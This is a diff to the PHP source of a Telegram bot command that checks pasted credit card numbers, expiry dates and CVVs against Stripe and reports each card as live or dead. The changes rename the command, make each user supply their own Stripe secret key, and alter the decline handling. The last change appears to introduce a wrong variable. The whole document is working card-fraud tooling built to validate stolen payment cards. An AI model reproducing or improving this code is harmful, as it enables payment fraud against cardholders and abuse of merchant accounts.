@@ -17,7 +17,7 @@ include_once __DIR__."/../functions/functions.php";
 
 
 ////////////====[MUTE]====////////////
-if(strpos($message, "/sm ") === 0 || strpos($message, "!sm ") === 0){   
+if(strpos($message, "/schk ") === 0 || strpos($message, "!schk ") === 0){   
     $antispam = antispamCheck($userId);
     addUser($userId);
     
@@ -40,7 +40,7 @@ if(strpos($message, "/sm ") === 0 || strpos($message, "!sm ") === 0){
         ]);
 
         $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
-        $lista = substr($message, 4);
+        $lista = substr($message, 6);
         $bin = substr($cc, 0, 6);
         
         if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
@@ -49,12 +49,21 @@ if(strpos($message, "/sm ") === 0 || strpos($message, "!sm ") === 0){
             $mon = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
             $year = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
             $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
-            $sk = $config['sk_keys'];
-            shuffle($sk);
-            $sec = $sk[0];
+            $sec = fetchAPIKey($userId);
+            
+            if(!preg_match_all("/sk_(test|live)_[A-Za-z0-9]+/", $sec, $matches)) {
+                bot('editMessageText',[
+                    'chat_id'=>$chat_id,
+                    'message_id'=>$messageidtoedit,
+                    'text'=>"<b>Add a SK Key First by using /apikey sk_live</b>",
+                    'parse_mode'=>'html',
+                    'disable_web_page_preview'=>'true'
+                    
+                ]);
+                return;
+            }
+        
 
-            file_put_contents('sk.txt',$sk);
-    
             ###CHECKER PART###  
             
             $ch = curl_init();
@@ -127,8 +136,8 @@ if(strpos($message, "/sm ") === 0 || strpos($message, "!sm ") === 0){
                     'message_id'=>$messageidtoedit,
                     'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» Dead ❌
-Response -» <code>$stripemessage</code>
-Gateway -» Stripe Auth 1
+Response -» <code>SK Key is Dead</code>
+Gateway -» User Stripe Merchant
 Time -» <b>$time</b><b>s</b>
 
 ------- Bin Info -------</b>
@@ -175,13 +184,10 @@ Time -» <b>$time</b><b>s</b>
             if (array_in_string($result1, $live_array)) {
                 $stripemessage = trim(strip_tags(capture($result1,'"message": "','"')));
                 $live = True;
-            }elseif(strpos($result1, '"cvc_check": "unavailable"')){
-                $stripemessage = 'CVC Check Unavailable';
-                $live = False;
             }else{
                 $stripemessage = capture($result1,'"decline_code": "','"');
                 if(empty($stripemessage)){
-                    $stripemessage = $result1;
+                    $stripemessage = $result;
                 }
                 $live = False;
             }
@@ -228,7 +234,7 @@ Time -» <b>$time</b><b>s</b>
                 'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» Dead ❌
 Response -» <code>$stripemessage</code>
-Gateway -» Stripe Auth 1
+Gateway -» User Stripe Merchant
 Time -» <b>$time</b><b>s</b>
 
 ------- Bin Info -------</b>
